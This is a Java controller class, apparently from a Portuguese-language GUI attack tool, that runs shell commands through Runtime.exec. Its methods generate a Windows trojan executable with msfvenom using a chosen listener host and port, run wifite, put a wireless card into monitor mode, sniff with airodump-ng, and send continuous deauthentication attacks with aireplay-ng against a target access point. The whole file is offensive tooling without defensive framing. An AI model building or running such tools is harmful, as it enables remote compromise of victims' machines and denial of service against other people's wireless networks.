/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.javanunes;
import static com.javanunes.DadosModel.executor;
/**
 *
 * @author ricardo
 */
public class VermutController {
    
    private static FormView formView = new FormView();
    private static DadosModel db = new DadosModel();;
    
    
    public void Exec(String comando){
        if(comando.equals("")){
            formView.MessageBox("Nao foi passado nenhum comando amor!");
        }
        try{
          Runtime.getRuntime().exec(comando);
          db.setStatusFezPorUltimo(comando);
        }
        catch(Exception e){
          formView.MessageBox("Deu um erro nesse comando ai "+ e);
        }
    }
    
    public void FazerTrojam(){
        String comando= "msfvenom -p "+formView.getCbTipoAtaque()+" LHOST="+formView.getCbHost()+" LPORT="+formView.getTxtPorta()+" -f exe -o /tmp/coisas.exe";
        //this.Exec(shell+comando);
        this.Exec(executor+comando);
    }
    
    public void MonitorWifiWifite(){
        this.Exec(executor+"wifite");
    }
    
    public void MonitorAiroDump(){
       String canal =formView.getCbChanelWifi();
       String segundoComandoPreparativo  = executor+"airodump-ng --channel " + canal + " " + formView.getCbPlacaDeRede();
       this.Exec(segundoComandoPreparativo);
    }
    
    public void Atacar(){
        String mac = formView.getMac();
        mac = mac.replace(":", "-");
        String comando = executor + "aireplay-ng --deauth 0 -a " + mac + " " + formView.getCbPlacaDeRede();
        this.Exec(comando);
    }
    
    public int PreparaPlacaParaAtaque(){
     if(!System.getenv("USER").equals("root")){
         formView.MessageBox("Amor, voce nao e o root, nao pode fazer isso!");
         return 0;
     }
     String placa = formView.getCbPlacaDeRede();
     String primeiroComandoPreparativo = executor+"airmon-ng check kill " + placa;
     //String segundoComandoPreparativo  = executor+"airodump-ng --channel " + canal + " " + txtMac.getText();
     this.Exec(primeiroComandoPreparativo);
     this.Exec(primeiroComandoPreparativo);
     this.Exec(primeiroComandoPreparativo);
     this.Exec(primeiroComandoPreparativo);
     this.Exec(primeiroComandoPreparativo);
     this.Exec(executor + "airmon-ng start " + placa);
     this.MonitorAiroDump();
     formView.setEnableBtPreparar(false);
     return 1;
    }
    
    
    
    
}
